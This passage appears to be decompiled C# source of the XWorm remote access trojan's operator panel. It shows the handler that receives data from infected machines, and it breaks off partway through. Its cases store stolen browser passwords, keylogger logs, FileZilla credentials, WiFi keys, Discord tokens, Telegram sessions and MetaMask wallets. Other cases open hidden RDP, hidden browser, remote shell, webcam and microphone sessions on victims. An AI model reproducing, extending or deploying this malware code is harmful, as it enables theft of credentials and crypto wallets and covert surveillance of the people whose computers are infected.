#define DEBUG
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using GMap.NET;
using GMap.NET.MapProviders;
using GMap.NET.WindowsForms;
using GMap.NET.WindowsForms.Markers;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NAudio.Wave;
using Newtonsoft.Json;
using XWorm.My;


namespace XWorm;

public class GClass10
{
	public delegate void _Read(GClass5 C, byte[] b);

	[CompilerGenerated]
	internal sealed class _Closure_0024__R5_002D0
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R5_002D0(_Closure_0024__R5_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R10(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R5_002D1
	{
		public GClass5 _0024VB_0024NonLocal_3;

		public _Closure_0024__R5_002D1(_Closure_0024__R5_002D1 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_3 = arg0._0024VB_0024NonLocal_3;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R11(object a0)
		{
			_0024VB_0024NonLocal_3.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R5_002D2
	{
		public GClass5 _0024VB_0024NonLocal_4;

		public _Closure_0024__R5_002D2(_Closure_0024__R5_002D2 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_4 = arg0._0024VB_0024NonLocal_4;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R12(object a0)
		{
			_0024VB_0024NonLocal_4.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R5_002D3
	{
		public GClass5 _0024VB_0024NonLocal_5;

		public _Closure_0024__R5_002D3(_Closure_0024__R5_002D3 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_5 = arg0._0024VB_0024NonLocal_5;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R13(object a0)
		{
			_0024VB_0024NonLocal_5.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R5_002D4
	{
		public GClass5 _0024VB_0024NonLocal_6;

		public _Closure_0024__R5_002D4(_Closure_0024__R5_002D4 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_6 = arg0._0024VB_0024NonLocal_6;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R14(object a0)
		{
			_0024VB_0024NonLocal_6.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R5_002D5
	{
		public GClass5 _0024VB_0024NonLocal_7;

		public _Closure_0024__R5_002D5(_Closure_0024__R5_002D5 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_7 = arg0._0024VB_0024NonLocal_7;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R15(object a0)
		{
			_0024VB_0024NonLocal_7.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R5_002D6
	{
		public GClass5 _0024VB_0024NonLocal_8;

		public _Closure_0024__R5_002D6(_Closure_0024__R5_002D6 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_8 = arg0._0024VB_0024NonLocal_8;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R16(object a0)
		{
			_0024VB_0024NonLocal_8.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R5_002D7
	{
		public GClass5 _0024VB_0024NonLocal_9;

		public _Closure_0024__R5_002D7(_Closure_0024__R5_002D7 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_9 = arg0._0024VB_0024NonLocal_9;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R17(object a0)
		{
			_0024VB_0024NonLocal_9.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R5_002D8
	{
		public GClass5 _0024VB_0024NonLocal_10;

		public _Closure_0024__R5_002D8(_Closure_0024__R5_002D8 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_10 = arg0._0024VB_0024NonLocal_10;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R18(object a0)
		{
			_0024VB_0024NonLocal_10.method_1((byte[])a0);
		}
	}

	public static Main main_0;

	public static GClass0 gclass0_0 = new GClass0(Application.StartupPath + "\\GeoIP.dat");

	public static void smethod_0(GClass5 C, byte[] b)
	{
		checked
		{
			try
			{
				string[] array = Strings.Split(Module0.smethod_7(Module0.smethod_13(b, C)), GClass19.string_0);
				switch (array[0])
				{
					case "FileM":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							FM fM6 = (FM)MyProject.Application.OpenForms["File Manager : " + array[1]];
							if (fM6 != null)
							{
								C.method_3();
							}
							else if (fM6 == null)
							{
								fM6 = new FM();
								fM6.gclass5_0 = C;
								fM6.string_0 = array[1];
								fM6.Name = "File Manager : " + array[1];
								fM6.Text = "File Manager : " + array[1];
								fM6.Show();
							}
							break;
						}
					case "FormHBrowser":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							HBrowser hBrowser = (HBrowser)MyProject.Application.OpenForms["Hidden Browser : " + array[1]];
							if (hBrowser != null)
							{
								C.method_3();
							}
							else if (hBrowser == null)
							{
								hBrowser = new HBrowser();
								hBrowser.gclass5_0 = C;
								hBrowser.Name = "Hidden Browser : " + array[1];
								hBrowser.Text = "Hidden Browser : " + array[1];
								hBrowser.Show();
							}
							break;
						}
					case "INFO":
						if (main_0.InvokeRequired)
						{
							main_0.Invoke(new _Read(smethod_0), C, b);
							break;
						}
						try
						{
							C.listViewItem_0 = main_0.Lv1.Items.Insert(0, C.string_0.Split(':')[0], gclass0_0.method_5(C.string_0.Split(':')[0]) + ".png");
							C.listViewItem_0.Tag = C;
							C.listViewItem_0.UseItemStyleForSubItems = false;
							C.listViewItem_0.SubItems.Add(gclass0_0.method_7(C.string_0.Split(':')[0]));
							int num12 = array.Length - 1;
							for (int k = 1; k <= num12; k++)
							{
								C.listViewItem_0.SubItems.Add(array[k]);
							}
							C.listViewItem_0.SubItems.Add(Module0.smethod_4(array[1]));
							C.listViewItem_0.SubItems.Add("0d 0h 0m 0s");
							C.listViewItem_0.SubItems.Add("0000 MS");
							C.listViewItem_0.SubItems.Add("...");
							main_0.Lv1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
							main_0._ActiveWindow.Width = 500;
							GClass19.gclass5s_0.Add(C);
							C.string_1 = C.listViewItem_0.SubItems[main_0._ID.Index].Text;
							Module0.smethod_3(C.string_0.Split(':')[0] + " Connected", Color.Green);
							if (GClass19.bool_0)
							{
								main_0.NotifyIcon1.BalloonTipText = "Connected: " + C.string_0.Split(':')[0];
								main_0.NotifyIcon1.ShowBalloonTip(100);
							}
							break;
						}
						catch (Exception ex3)
						{
							ProjectData.SetProjectError(ex3);
							Exception ex4 = ex3;
							Debug.WriteLine("INFO: " + ex4.Message);
							ProjectData.ClearProjectError();
							break;
						}
					case "hrdpErr":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							HRDP hRDP3 = (HRDP)MyProject.Application.OpenForms["Hidden RDP : " + array[1]];
							if (hRDP3 != null)
							{
								hRDP3.ToolStripStatusLabel1.ForeColor = Color.Red;
								hRDP3.ToolStripStatusLabel1.Text = array[2];
							}
							break;
						}
					case "ServiceManager":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							ServiceManager serviceManager2 = (ServiceManager)MyProject.Application.OpenForms["Service Manager : " + array[1]];
							if (serviceManager2 != null)
							{
								C.method_3();
							}
							else if (serviceManager2 == null)
							{
								serviceManager2 = new ServiceManager();
								serviceManager2.gclass5_0 = C;
								serviceManager2.Name = "Service Manager : " + array[1];
								serviceManager2.Text = "Service Manager : " + array[1];
								serviceManager2.Show();
							}
							break;
						}
					case "MBox":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							MBox mBox = (MBox)MyProject.Application.OpenForms["MessageBox : " + array[1]];
							if (mBox != null)
							{
								C.method_3();
							}
							else if (mBox == null)
							{
								mBox = new MBox();
								mBox.gclass5_0 = C;
								mBox.Name = "MessageBox : " + array[1];
								mBox.Text = "MessageBox : " + array[1];
								mBox.Show();
							}
							break;
						}
					case "shell":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Shell shell2 = (Shell)MyProject.Application.OpenForms["Shell : " + array[1]];
							if (shell2 != null)
							{
								C.method_3();
							}
							else if (shell2 == null)
							{
								shell2 = new Shell();
								shell2.gclass5_0 = C;
								shell2.Name = "Shell : " + array[1];
								shell2.Text = "Shell : " + array[1];
								shell2.Show();
							}
							break;
						}
					case "Chromium":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							string text11 = Path.Combine(Application.StartupPath, "ClientsFolder", array[1], "Recovery");
							string text12 = array[2];
							if (!string.IsNullOrEmpty(text12))
							{
								if (!Directory.Exists(text11))
								{
									Directory.CreateDirectory(text11);
								}
								File.WriteAllText(text11 + "\\Chromium_" + DateAndTime.Now.ToString("MM-dd-yyyy HH;mm;ss;fff") + ".txt", text12);
								Module0.smethod_3(C.string_0.Split(':')[0] + " Chromium Passwords Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery", Color.Purple);
							}
							else
							{
								Module0.smethod_3(C.string_0.Split(':')[0] + " Has No Passwords", Color.MediumPurple);
							}
							break;
						}
					case "FileManagerMSG":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							FM fM3 = (FM)MyProject.Application.OpenForms["File Manager : " + array[1]];
							if (fM3 != null)
							{
								fM3.ToolStripStatusLabel1.ForeColor = Color.Green;
								fM3.ToolStripStatusLabel1.Visible = true;
								fM3.ToolStripStatusLabel1.Text = array[2];
							}
							break;
						}
					case "StartupManager":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							StartupManager startupManager2 = (StartupManager)MyProject.Application.OpenForms["Startup Manager : " + array[1]];
							if (startupManager2 != null)
							{
								C.method_3();
							}
							else if (startupManager2 == null)
							{
								startupManager2 = new StartupManager();
								startupManager2.gclass5_0 = C;
								startupManager2.Name = "Startup Manager : " + array[1];
								startupManager2.Text = "Startup Manager : " + array[1];
								startupManager2.Show();
							}
							break;
						}
					case "SNDGet":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Sound sound = (Sound)MyProject.Application.OpenForms["System Sound : " + array[3]];
							if (sound == null)
							{
								break;
							}
							sound.ToolStripStatusLabel1.Text = "Size :  [" + Module0.smethod_11(b.LongLength) + "]";
							try
							{
								sound.bufferedWaveProvider_0.AddSamples(Module0.smethod_8(Convert.FromBase64String(array[1])), 0, Convert.ToInt32(array[2]));
								GC.Collect();
								break;
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								break;
							}
						}
					case "ActiveWindows":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							ACT aCT = (ACT)MyProject.Application.OpenForms["ActiveWindows : " + array[1]];
							if (aCT != null)
							{
								C.method_3();
							}
							else if (aCT == null)
							{
								aCT = new ACT();
								aCT.gclass5_0 = C;
								aCT.Name = "ActiveWindows : " + array[1];
								aCT.Text = "ActiveWindows : " + array[1];
								aCT.Show();
							}
							break;
						}
					case "R/":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Shell shell = (Shell)MyProject.Application.OpenForms["Shell : " + array[2]];
							if (shell != null)
							{
								shell.Guna2TextBox2.Text += array[1];
								shell.Guna2TextBox2.SelectionStart = shell.Guna2TextBox2.Text.Length;
								shell.Guna2TextBox2.ScrollToCaret();
								shell.Guna2TextBox2.Refresh();
							}
							break;
						}
					case "R#":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							ProcessV processV2 = (ProcessV)MyProject.Application.OpenForms["Process Manager : " + array[3]];
							if (processV2 == null)
							{
								break;
							}
							processV2.ListView1.Items.Clear();
							processV2.ImageList1.Images.Clear();
							string[] array13 = Strings.Split(array[1], "-=>");
							int num28 = array13.Length - 1;
							int num29;
							for (num29 = 0; num29 <= num28; num29++)
							{
								if (array13[num29].Length > 0)
								{
									ListViewItem listViewItem10 = new ListViewItem();
									if (Operators.CompareString(array13[num29 + 1], array[2], TextCompare: false) == 0)
									{
										listViewItem10.ForeColor = Color.Red;
									}
									listViewItem10.Text = array13[num29];
									listViewItem10.SubItems.Add(array13[num29 + 1]);
									listViewItem10.SubItems.Add(array13[num29 + 4]);
									Image image5 = Image.FromStream(new MemoryStream(Module0.smethod_8(Convert.FromBase64String(array13[num29 + 2]))));
									processV2.ImageList1.Images.Add(array13[num29 + 1], image5);
									listViewItem10.ImageKey = array13[num29 + 1];
									listViewItem10.ToolTipText = array13[num29 + 3];
									processV2.ListView1.Items.Add(listViewItem10);
								}
								num29 += 4;
							}
							processV2.ToolStripStatusLabel4.Text = "Process [" + Conversions.ToString(processV2.ListView1.Items.Count) + "]";
							processV2.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
							break;
						}
					case "OfflineGet":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							string text15 = Path.Combine(Application.StartupPath, "ClientsFolder", array[1], "Keylogger");
							string text16 = array[2];
							if (!Directory.Exists(text15))
							{
								Directory.CreateDirectory(text15);
							}
							File.WriteAllText(text15 + "\\KeyLogger_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss;fff") + ".txt", text16.Replace("\n", Environment.NewLine).Replace("[ENTER]", Environment.NewLine).Replace("[SPACE]", " "));
							Module0.smethod_3(C.string_0.Split(':')[0] + " keyLogger was saved @ ClientsFolder \\ " + array[1] + " \\ Keylogger", Color.Purple);
							break;
						}
					case "Xchat":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Chat chat = (Chat)MyProject.Application.OpenForms["Chat : " + array[1]];
							if (chat != null)
							{
								C.method_3();
							}
							else if (chat == null)
							{
								chat = new Chat();
								chat.gclass5_0 = C;
								chat.Name = "Chat : " + array[1];
								chat.Text = "Chat : " + array[1];
								chat.bool_0 = false;
								chat.Show();
							}
							break;
						}
					case "Recovery":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							string text20 = Path.Combine(Application.StartupPath, "ClientsFolder", array[1], "Recovery");
							string text21 = array[3];
							if (!string.IsNullOrEmpty(text21) && !Directory.Exists(text20))
							{
								Directory.CreateDirectory(text20);
							}
							switch (Convert.ToInt32(array[2]))
							{
								case 0:
									if (string.IsNullOrEmpty(text21))
									{
										Module0.smethod_3(C.string_0.Split(':')[0] + " Has No FileZilla", Color.MediumPurple);
									}
									else
									{
										File.WriteAllText(text20 + "\\FileZilla_" + DateAndTime.Now.ToString("MM-dd-yyyy HH;mm;ss;fff") + ".txt", text21);
										Module0.smethod_3(C.string_0.Split(':')[0] + " FileZilla Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery", Color.Purple);
									}
									break;
								case 1:
									if (string.IsNullOrEmpty(text21))
									{
										Module0.smethod_3(C.string_0.Split(':')[0] + " Has No WifiKeys", Color.MediumPurple);
									}
									else
									{
										File.WriteAllText(text20 + "\\WifiKeys_" + DateAndTime.Now.ToString("MM-dd-yyyy HH;mm;ss;fff") + ".txt", text21);
										Module0.smethod_3(C.string_0.Split(':')[0] + " WifiKeys Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery", Color.Purple);
									}
									break;
								case 2:
									if (string.IsNullOrEmpty(text21))
									{
										Module0.smethod_3(C.string_0.Split(':')[0] + " Has No DiscordToken", Color.MediumPurple);
									}
									else
									{
										File.WriteAllText(text20 + "\\DiscordToken_" + DateAndTime.Now.ToString("MM-dd-yyyy HH;mm;ss;fff") + ".txt", text21);
										Module0.smethod_3(C.string_0.Split(':')[0] + " DiscordToken Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery", Color.Purple);
									}
									break;
								case 3:
									if (string.IsNullOrEmpty(text21))
									{
										Module0.smethod_3(C.string_0.Split(':')[0] + " Has No ProductKey", Color.MediumPurple);
									}
									else
									{
										File.WriteAllText(text20 + "\\ProductKey_" + DateAndTime.Now.ToString("MM-dd-yyyy HH;mm;ss;fff") + ".txt", text21);
										Module0.smethod_3(C.string_0.Split(':')[0] + " ProductKey Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery", Color.Purple);
									}
									break;
								case 4:
									if (string.IsNullOrEmpty(text21))
									{
										Module0.smethod_3(C.string_0.Split(':')[0] + " Has No Telegram_tdata", Color.MediumPurple);
									}
									else
									{
										File.WriteAllBytes(text20 + "\\Telegram_tdata_" + DateAndTime.Now.ToString("MM-dd-yyyy HH;mm;ss;fff") + ".zip", Module0.smethod_8(Convert.FromBase64String(text21)));
										Module0.smethod_3(C.string_0.Split(':')[0] + " Telegram_tdata Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery", Color.Purple);
									}
									break;
								case 5:
									if (string.IsNullOrEmpty(text21))
									{
										Module0.smethod_3(C.string_0.Split(':')[0] + " Has No MetaMask", Color.MediumPurple);
									}
									else
									{
										File.WriteAllBytes(text20 + "\\MetaMask_" + DateAndTime.Now.ToString("MM-dd-yyyy HH;mm;ss;fff") + ".zip", Module0.smethod_8(Convert.FromBase64String(text21)));
										Module0.smethod_3(C.string_0.Split(':')[0] + " MetaMask Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery", Color.Purple);
									}
									break;
							}
							break;
						}
					case "Registry":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Registry registry3 = (Registry)MyProject.Application.OpenForms["Registry Editor : " + array[1]];
							if (registry3 != null)
							{
								C.method_3();
							}
							else if (registry3 == null)
							{
								registry3 = new Registry();
								registry3.gclass5_0 = C;
								registry3.Name = "Registry Editor : " + array[1];
								registry3.Text = "Registry Editor : " + array[1];
								registry3.Show();
							}
							break;
						}
					case "GetPrograms":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Programs programs = (Programs)MyProject.Application.OpenForms["Installed Programs : " + array[1]];
							if (programs == null)
							{
								break;
							}
							string[] array6 = Strings.Split(array[2], "-=>");
							int num10 = array6.Length - 2;
							int num11;
							for (num11 = 0; num11 <= num10; num11++)
							{
								if (array6[num11].Length > 0)
								{
									ListViewItem listViewItem5 = new ListViewItem();
									listViewItem5.Text = array6[num11];
									listViewItem5.SubItems.Add(array6[num11 + 1]);
									listViewItem5.ImageIndex = 0;
									programs.ListView1.Items.Add(listViewItem5);
								}
								num11++;
							}
							programs.ToolStripStatusLabel2.Text = "Installed [" + Conversions.ToString(programs.ListView1.Items.Count) + "]";
							programs.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
							break;
						}
					case "hrdp+":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							HRDP hRDP = (HRDP)MyProject.Application.OpenForms["Hidden RDP : " + array[1]];
							if (hRDP != null)
							{
								string text5 = array[2];
								string text6 = array[3];
								string text7 = array[4];
								hRDP.ToolStripStatusLabel1.ForeColor = Color.Green;
								hRDP.ToolStripStatusLabel1.Text = text7 + " [" + text5 + ":" + text6 + "]";
								ProcessStartInfo processStartInfo = new ProcessStartInfo();
								processStartInfo.FileName = "cmd.exe";
								processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
								processStartInfo.Arguments = "/c cmdkey /generic:\"" + text7.Split(':')[0] + "\" /user:\"" + text5 + "\" /pass:\"" + text6 + "\"";
								Process.Start(processStartInfo).WaitForExit();
								Process.Start("mstsc.exe", "/v:" + text7);
							}
							break;
						}
					case "FormHApps":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							HApps hApps4 = (HApps)MyProject.Application.OpenForms["Hidden Apps : " + array[1]];
							if (hApps4 != null)
							{
								C.method_3();
							}
							else if (hApps4 == null)
							{
								hApps4 = new HApps();
								hApps4.gclass5_0 = C;
								hApps4.Name = "Hidden Apps : " + array[1];
								hApps4.Text = "Hidden Apps : " + array[1];
								hApps4.Show();
							}
							break;
						}
					case "txtttt":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							TXT tXT = (TXT)MyProject.Application.OpenForms["Text Viewer : " + array[1]];
							if (tXT == null)
							{
								tXT = new TXT();
								tXT.gclass5_0 = C;
								tXT.Name = "Text Viewer : " + array[1];
								tXT.Text = "Text Viewer : " + array[1];
								tXT.Show();
							}
							try
							{
								TXT tXT2 = (TXT)MyProject.Application.OpenForms["Text Viewer : " + array[1]];
								tXT2.Guna2TextBox1.Text = array[2];
								tXT2.Guna2TextBox2.Text = array[3];
								break;
							}
							catch (Exception projectError6)
							{
								ProjectData.SetProjectError(projectError6);
								ProjectData.ClearProjectError();
								break;
							}
						}
					case "Ngrok":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							ngrok ngrok2 = (ngrok)MyProject.Application.OpenForms["Ngrok Installer : " + array[1]];
							if (ngrok2 != null)
							{
								C.method_3();
							}
							else if (ngrok2 == null)
							{
								ngrok2 = new ngrok();
								ngrok2.gclass5_0 = C;
								ngrok2.Name = "Ngrok Installer : " + array[1];
								ngrok2.Text = "Ngrok Installer : " + array[1];
								ngrok2.Show();
							}
							break;
						}
					case "CompilerErr":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							VBCode vBCode3 = (VBCode)MyProject.Application.OpenForms["VB.Net Compiler : " + array[1]];
							if (vBCode3 != null)
							{
								vBCode3.ToolStripStatusLabel1.ForeColor = Color.Red;
								vBCode3.ToolStripStatusLabel1.Visible = true;
								vBCode3.ToolStripStatusLabel1.Text = array[2];
							}
							break;
						}
					case "WBCM":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							WebCam webCam2 = (WebCam)MyProject.Application.OpenForms["WebCam : " + array[2]];
							if (webCam2 != null)
							{
								C.method_3();
							}
							else
							{
								if (webCam2 != null)
								{
									break;
								}
								webCam2 = new WebCam();
								webCam2.gclass5_0 = C;
								webCam2.string_0 = array[2];
								webCam2.Name = "WebCam : " + array[2];
								webCam2.Text = "WebCam : " + array[2];
								string[] array11 = Strings.Split(array[1], "-=>");
								foreach (string text18 in array11)
								{
									if (Operators.CompareString(text18, null, TextCompare: false) != 0)
									{
										webCam2.Guna2ComboBox2.Items.Add(text18);
									}
								}
								webCam2.Guna2ComboBox2.SelectedIndex++;
								webCam2.Show();
							}
							break;
						}
					case "MICCM":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							MIC mIC2 = (MIC)MyProject.Application.OpenForms["MIC : " + array[2]];
							if (mIC2 != null)
							{
								C.method_3();
							}
							else
							{
								if (mIC2 != null)
								{
									break;
								}
								mIC2 = new MIC();
								mIC2.gclass5_0 = C;
								mIC2.Name = "MIC : " + array[2];
								mIC2.Text = "MIC : " + array[2];
								string[] array9 = Strings.Split(array[1], "-=>");
								foreach (string text13 in array9)
								{
									if (Operators.CompareString(text13, null, TextCompare: false) != 0)
									{
										mIC2.Guna2ComboBox1.Items.Add(text13);
									}
								}
								mIC2.Guna2ComboBox1.SelectedIndex++;
								try
								{
									mIC2.waveOut_0.Init(mIC2.bufferedWaveProvider_0);
									mIC2.waveOut_0.Play();
								}
								catch (Exception projectError5)
								{
									ProjectData.SetProjectError(projectError5);
									ProjectData.ClearProjectError();
								}
								mIC2.Show();
							}
							break;
						}
					case "#CAP":
						if (main_0.InvokeRequired)
						{
							main_0.Invoke(new _Read(smethod_0), C, b);
						}
						else
						{
							if (!GClass19.bool_1)
							{
								break;
							}
							MemoryStream memoryStream = new MemoryStream(Module0.smethod_8(Convert.FromBase64String(array[2])));
							Image.FromStream(memoryStream);
							foreach (ListViewItem item in main_0.Lv4.Items)
							{
								if (Operators.CompareString(item.SubItems[0].Text, array[1], TextCompare: false) == 0)
								{
									string key = array[1];
									Image image2 = main_0.ImageList1.Images[main_0.ImageList1.Images.Keys.IndexOf(array[1])];
									main_0.ImageList1.Images.RemoveByKey(key);
									main_0.ImageList1.Images.Add(key, Image.FromStream(memoryStream));
									image2.Dispose();
									memoryStream.Dispose();
									return;
								}
							}
							main_0.ImageList1.Images.Add(array[1], Image.FromStream(memoryStream));
							main_0.Lv4.Items.Add(array[1], array[1]);
							memoryStream.Dispose();
						}
						break;
					case "VOICECHAT":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							VoiceChat voiceChat = (VoiceChat)MyProject.Application.OpenForms["Voice Chat : " + array[1]];
							if (voiceChat != null)
							{
								C.method_3();
							}
							else if (voiceChat == null)
							{
								voiceChat = new VoiceChat();
								voiceChat.gclass5_0 = C;
								voiceChat.Name = "Voice Chat : " + array[1];
								voiceChat.Text = "Voice Chat : " + array[1];
								int num = WaveIn.DeviceCount - 1;
								for (int i = 0; i <= num; i++)
								{
									voiceChat.Guna2ComboBox1.Items.Add(WaveIn.GetCapabilities(i).ProductName);
								}
								if (voiceChat.Guna2ComboBox1.Items.Count < 1)
								{
									C.method_3();
									Module0.smethod_3("No microphone device can be found!", Color.Red);
									GClass19.int_1++;
								}
								else
								{
									voiceChat.Guna2ComboBox1.SelectedIndex = 0;
									voiceChat.Show();
								}
							}
							break;
						}
					case "Msg":
						if (main_0.InvokeRequired)
						{
							main_0.Invoke(new _Read(smethod_0), C, b);
						}
						else
						{
							Module0.smethod_3(C.string_0.Split(':')[0] + " " + array[1], Color.Purple);
							GClass19.int_1++;
						}
						break;
					case "Cam":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							WebCam webCam = (WebCam)MyProject.Application.OpenForms["WebCam : " + array[2]];
							if (webCam == null)
							{
								break;
							}
							MemoryStream memoryStream3 = new MemoryStream(Module0.smethod_8(Convert.FromBase64String(array[1])));
							webCam.PictureBox1.Image = Image.FromStream(memoryStream3);
							webCam.int_0++;
							if (webCam.stopwatch_0.ElapsedMilliseconds >= 1000L)
							{
								webCam.Text = "WebCam : " + array[2] + "  FPS:" + webCam.int_0 + "  Size:" + Module0.smethod_11(b.LongLength);
								webCam.int_0 = 0;
								webCam.stopwatch_0 = Stopwatch.StartNew();
							}
							if (webCam.ToolStripStatusLabel4.ForeColor == Color.Green)
							{
								webCam.method_0(memoryStream3);
							}
							if (Operators.CompareString(webCam.Guna2GradientButton1.Text, "Stop", TextCompare: false) == 0)
							{
								byte[] state5 = Module0.smethod_6("Cam" + GClass19.string_0 + webCam.Guna2ComboBox2.SelectedIndex + GClass19.string_0 + webCam.Guna2ComboBox1.Text.Replace("%", "").ToString());
								_Closure_0024__R5_002D3 arg5 = default(_Closure_0024__R5_002D3);
								_Closure_0024__R5_002D3 CS_0024_003C_003E8__locals7 = new _Closure_0024__R5_002D3(arg5);
								CS_0024_003C_003E8__locals7._0024VB_0024NonLocal_5 = C;
								ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
								{
									CS_0024_003C_003E8__locals7._0024VB_0024NonLocal_5.method_1((byte[])a0);
								}, state5);
							}
							break;
						}
					case "Hash":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Hash hash = (Hash)MyProject.Application.OpenForms["File Hash : " + array[1] + " (" + array[3] + ")"];
							if (hash == null)
							{
								hash = new Hash();
								hash.gclass5_0 = C;
								hash.Name = "File Hash : " + array[1] + " (" + array[3] + ")";
								hash.Text = "File Hash : " + array[1] + " (" + array[3] + ")";
								hash.Show();
							}
							try
							{
								Hash hash2 = (Hash)MyProject.Application.OpenForms["File Hash : " + array[1] + " (" + array[3] + ")"];
								hash2.Text = "File Hash : " + array[1] + " (" + array[3] + ")";
								hash2.Guna2TextBox1.Text = array[2];
								break;
							}
							catch (Exception projectError4)
							{
								ProjectData.SetProjectError(projectError4);
								ProjectData.ClearProjectError();
								break;
							}
						}
					case "HApps+":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							HApps hApps2 = (HApps)MyProject.Application.OpenForms["Hidden Apps : " + array[1]];
							if (hApps2 == null)
							{
								break;
							}
